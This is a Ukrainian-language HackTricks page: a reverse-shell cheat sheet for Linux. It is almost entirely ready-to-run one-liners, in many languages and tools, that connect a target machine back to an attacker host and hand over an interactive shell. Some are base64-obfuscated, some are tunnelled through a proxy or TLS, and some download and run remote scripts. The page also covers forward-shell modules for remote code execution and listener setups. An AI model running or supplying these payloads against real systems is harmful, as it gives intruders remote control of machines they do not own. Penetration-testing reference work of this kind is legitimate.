# Оболонки - Linux

{{#include ../../banners/hacktricks-training.md}}

**Якщо у вас є запитання щодо будь-якої з цих оболонок, перевірте їх за допомогою** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>

## Повноцінний TTY

**Щойно ви отримаєте reverse shell,**[ **прочитайте цю сторінку, щоб отримати повноцінний TTY**](full-ttys.md)**.**

Наведені нижче базові payload-и reverse shell також описані в шпаргалках HighOn.Coffee і PayloadsAllTheThings; перш ніж вибирати payload, перевірте, чи доступні на цільовій системі потрібний інтерпретатор і утиліти.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh

```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```

Не забудьте перевірити й інші оболонки: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh і bash.

### Shell із безпечними символами

```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```

#### Пояснення щодо shell

Наведені нижче пункти підсумовують задокументовану поведінку Bash під час інтерактивної роботи та перенаправлення:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Ця частина команди запускає інтерактивну (`-i`) оболонку Bash.
2. **`>&`**: Ця частина команди — скорочений запис для **перенаправлення стандартного виводу** (`stdout`) і **стандартного потоку помилок** (`stderr`) **до одного й того самого місця призначення**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Це спеціальний файл, який **представляє TCP-з’єднання із зазначеною IP-адресою та портом**.
   - **Перенаправивши вивід і потоки помилок до цього файлу**, команда фактично надсилає вивід інтерактивного сеансу shell на машину зловмисника.
4. **`0>&1`**: Ця частина команди **перенаправляє стандартний ввід (`stdin`) до того самого місця призначення, що й стандартний вивід (`stdout`)**.

### Створення у файлі та виконання

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```

## Forward Shell

Коли доступний RCE, але reverse shell блокує firewall, NAT або фільтрація вихідного трафіку, forward shell через канал RCE може забезпечити напівінтерактивний сеанс.<sup>[[12]](#references)</sup>

Рекомендований для цього інструмент — [toboggan](https://github.com/n3rada/toboggan.git), який обгортає примітив виконання команд в інтерактивний сеанс.<sup>[[12]](#references)</sup>

Щоб скористатися toboggan, створіть модуль Python, адаптований до контексту RCE цільової системи; його інтерфейс модуля очікує функцію `execute(command, timeout)`, яка повертає вивід команди.<sup>[[12]](#references)</sup> Наприклад, модуль `nix.py` може мати таку структуру:

```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
    token = jwt.encode(
        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
    )

    response = httpx.get(
        url="https://vulnerable.io:3200",
        headers={"Authorization": f"Bearer {token}"},
        timeout=timeout,
        # ||BURP||
        verify=False,
    )

    # Check if the request was successful
    response.raise_for_status()

    return response.text
```

Запустіть модуль, використовуючи поточний синтаксис командного рядка toboggan:<sup>[[12]](#references)</sup>

```shell
toboggan nix.py
```

Це запускає інтерактивний сеанс. Для вбудованого backend Burp Suite використовуйте `toboggan --request burp_request.xml`; для backend-обгортки команд використовуйте `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>

Ще один варіант — реалізація forward-shell від `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Потрібно змінити такі частини:<sup>[[13]](#references)</sup>

- URL вразливого хоста
- Префікс і суфікс вашого payload (якщо є)
- Спосіб надсилання payload (заголовки? дані? додаткова інформація?)

Після цього можна **надсилати команди** або скористатися командою **`upgrade`**, щоб отримати повноцінний PTY; реалізація опитує вивід з інтервалом приблизно 1,3 секунди.<sup>[[13]](#references)</sup>

## Netcat

```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## BusyBox

BusyBox об’єднує багато утиліт в один невеликий виконуваний файл і часто використовується в малих або вбудованих системах Linux. Якщо окремої утиліти `nc` немає, перевірте, чи доступна вона в BusyBox:<sup>[[8]](#references)[[19]](#references)</sup>

```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```

Якщо `busybox nc` є, але інтерактивне виконання працює нестабільно, адаптуйте шаблон FIFO з розділу `nc` для цього аплета:<sup>[[2]](#references)[[8]](#references)</sup>

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```

## gsocket

Перегляньте офіційні інструкції з розгортання на [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>

```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```

## Telnet

```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```

## Whois

**Зловмисник**

```bash
while true; do nc -l <port>; done
```

Використайте ту саму послідовність введення Enter/CTRL+D, описану в розділі Whois.<sup>[[3]](#references)</sup>

**Жертва**

```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python

```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

## Perl

```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP

```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```

## Java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Ncat

```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```

### Через явно заданий вихідний проксі

Якщо ціль може підключитися до HTTP-проксі `CONNECT` або SOCKS, але не може встановити пряме TCP-з’єднання зі слухачем, використовуйте **Ncat** у режимі підключення. Проксі має дозволяти тунель до хоста й порту слухача; `CONNECT` лише пересилає байти після встановлення з’єднання, тому звичайна оболонка **не є** HTTP-трафіком і не стає зашифрованою лише через використання HTTP-проксі.<sup>[[20]](#references)[[21]](#references)[[22]](#references)</sup>

```bash
# Attacker: expose a listener reachable from the proxy
ncat -l 443

# Target: HTTP CONNECT proxy (default proxy type)
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type http --exec "/bin/sh -i" <ATTACKER_HOST> 443

# Target: use this instead for a SOCKS5 proxy
ncat --proxy <PROXY_HOST>:<PROXY_PORT> --proxy-type socks5 --exec "/bin/sh -i" <ATTACKER_HOST> 443
```

Для proxy з автентифікацією Ncat підтримує `--proxy-auth` або `NCAT_PROXY_AUTH` (останній варіант дає змогу не вказувати облікові дані в аргументах команди).<sup>[[23]](#references)</sup> За замовчуванням proxy самостійно визначає IP-адреси цільових хостів; використовуйте `--proxy-dns local` лише за потреби локального визначення адрес.<sup>[[23]](#references)</sup> Якщо proxy вимагає TLS або протоколів прикладного рівня, окрім `CONNECT`, використовуйте відповідний зашифрований транспорт, а не припускайте, що порт 443 маскує raw shell; див. [тунелювання та перенаправлення портів](../tunneling-and-port-forwarding.md) щодо транспорту на основі WebSocket.<sup>[[22]](#references)[[24]](#references)</sup>

## Golang

```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua

```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```

## Zsh (вбудований TCP)

```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```

## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – сучасний слухач на кшталт netcat, написаний на Rust.<sup>[[5]](#references)</sup>

```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
  && chmod +x /tmp/rcat \
  && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```

Можливості, описані в проєкті:<sup>[[5]](#references)</sup>
- Історія команд і автодоповнення в інтерактивному режимі
- `-s` для вибору виконуваного файла оболонки, який використовує `connect`

## pwncat-cs

Якщо у вас уже є **будь-який raw reverse shell**, але потрібен listener, який може налаштувати зручнішу сесію, `pwncat-cs` може обробити підключення та спробувати створити віддалений PTY.<sup>[[7]](#references)</sup>

```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```

Він також підтримує **зашифровані** канали `ssl-bind` і `ssl-connect`, тож його можна поєднати з payloads `ncat --ssl` або `socat OPENSSL:`, коли потрібне шифрування трафіку.<sup>[[7]](#references)</sup>

## revsh (encrypted & pivot-ready)

`revsh` — це компактний C-клієнт/сервер, який забезпечує повноцінний TTY через **зашифрований тунель Diffie–Hellman** і за бажанням може підключати інтерфейс **TUN/TAP** для pivoting у стилі reverse VPN.<sup>[[6]](#references)</sup>

```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```

Корисні прапорці, описані в `revsh`, включають:<sup>[[6]](#references)</sup>
- `-b`: режим bind-shell (увімкніть його на обох кінцях)
- `-D [LHOST:]LPORT` або `-B [RHOST:]RPORT`: динамічне перенаправлення SOCKS 4/4a/5
- `-x`: вимкнути автоматичне налаштування проксі, зокрема стандартне налаштування TUN/TAP

Зашифрований тунель не дає передавати трафік shell у відкритому вигляді, але сам по собі не обходить мережеві політики.<sup>[[6]](#references)</sup>

## OpenSSL

У цьому розділі використовуються команди OpenSSL `req`, `s_server` і `s_client` для створення сертифіката й передавання shell через TLS.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

Зловмисник (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```

Жертва

```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```

Ви все ще можете використовувати класичний шаблон із **двома слухачами**, якщо потрібні окремі канали введення/виведення.<sup>[[16]](#references)[[17]](#references)</sup>

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

## Awk

```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## Finger

**Зловмисник**

```bash
while true; do nc -l 79; done
```

Щоб надіслати команду, введіть її, натисніть Enter, а потім CTRL+D (щоб зупинити STDIN).<sup>[[3]](#references)</sup>

**Жертва**

```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```

## Gawk

```bash
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

## Xterm

Ця команда спробує підключитися до вашої системи через порт 6001.<sup>[[2]](#references)</sup>

```bash
xterm -display 10.0.0.1:1
```

Щоб перехопити reverse shell, використовуйте X server, що прослуховує порт 6001, як показано нижче.<sup>[[2]](#references)</sup>

```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```

## Groovy

від [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). ПРИМІТКА: Java reverse shell також працює з Groovy.<sup>[[18]](#references)</sup>

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## References

- [1] [Пам’ятка Reverse Shell: PHP, ASP, Netcat, Bash і Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Пам’ятка Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Використання Whois і Finger для Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings — пам’ятка Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat — сучасний слухач портів і Reverse Shell](https://github.com/robiot/rustcat)
- [6] [revsh — Reverse Shell із підтримкою термінала, тунелюванням даних і розширеними можливостями pivoting](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) — платформа post-exploitation](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Довідник Bash: перенаправлення](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Довідник Bash: запуск Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Інструкції з розгортання Global Socket](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Reverse Shell на чистому Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
- [20] [Проксіювання через Ncat](https://nmap.org/ncat/guide/ncat-proxy.html)
- [21] [Виконання команд через Ncat](https://nmap.org/ncat/guide/ncat-exec.html)
- [22] [RFC 9110: CONNECT](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.3.6)
- [23] [Довідник Ncat](https://nmap.org/book/ncat-man.html)
- [24] [README wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
{{#include ../../banners/hacktricks-training.md}}
